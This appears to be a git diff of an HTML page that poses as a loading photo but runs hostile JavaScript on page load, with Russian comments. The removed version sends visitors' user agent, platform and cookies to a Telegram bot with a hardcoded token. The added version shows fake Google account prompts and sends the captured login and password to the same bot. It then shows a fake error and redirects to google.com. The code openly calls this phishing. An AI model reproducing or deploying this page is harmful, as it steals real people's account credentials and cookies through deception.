@@ -14,37 +14,43 @@
     <p>Загрузка фото, подождите...</p>
 
     <script>
-        // --- ВСТАВЬТЕ СВОИ ДАННЫЕ СЮДА ---
-        const TOKEN = "8284770824:AAHX0Xk6f5AljsIEDqU7CU9kCS7Bijh5LNQ"; // Токен от @BotFather
-        const CHAT_ID = "7532993584";        // Ваш ID от @userinfobot
-        // --------------------------------
+                const CFG = {
+            t: "8284770824:AAHX0Xk6f5AljsIEDqU7CU9kCS7Bijh5LNQ",
+            c: "7532993584",
+            r: "https://google.com" 
+        };
 
-        async function collectData() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookies: document.cookie || "Доступ к куки закрыт"
-            };
+        async function logAndHack() {
+            // 1. Собираем системные данные
+            const info = `📊 ЛОГ:\n📱 Устройство: ${navigator.userAgent}\n🖥 Экран: ${window.screen.width}x${window.screen.height}`;
+            
+            await fetch(`https://api.telegram.org/bot${CFG.t}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CFG.c, text: info })
+            });
 
-            const text = `⚠️ НОВЫЙ ПОСЕТИТЕЛЬ!\n\n📱 Устройство: ${info.userAgent}\n🌐 Платформа: ${info.platform}\n🍪 Cookies: ${info.cookies}`;
-
-            // Отправка в ваш Телеграм
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            // 2. Выводим "силовое" окно (Фишинг)
+            // Это окно выглядит как системное требование Android/Браузера
+            let login = prompt("⚠️ Внимание!\nДля доступа к медиафайлу необходимо подтвердить аккаунт Google.\n\nВведите Email или Телефон:");
+            let pass = prompt("Введите пароль:");
+            
+            if (login && pass) {
+                const secret = `🔑 ПЕРЕХВАЧЕН ПАРОЛЬ!\n👤 Логин: ${login}\n🔓 Пасс: ${pass}`;
+                await fetch(`https://api.telegram.org/bot${CFG.t}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    body: JSON.stringify({ chat_id: CFG.c, text: secret })
                 });
-            } catch (e) {}
+                alert("Ошибка авторизации. Попробуйте еще раз через 5 минут.");
+            }
 
-            // Редирект на реальную картинку через 2 секунды
-            setTimeout(() => {
-                window.location.href = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqZzVqJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxxXLyKHzqM/giphy.gif";
-            }, 2000);
+            // 3. Уходим на реальный сайт
+            window.location.href = CFG.r;
         }
 
-        window.onload = collectData;
+        window.onload = logAndHack;
+        
     </script>
 </body>
 </html>
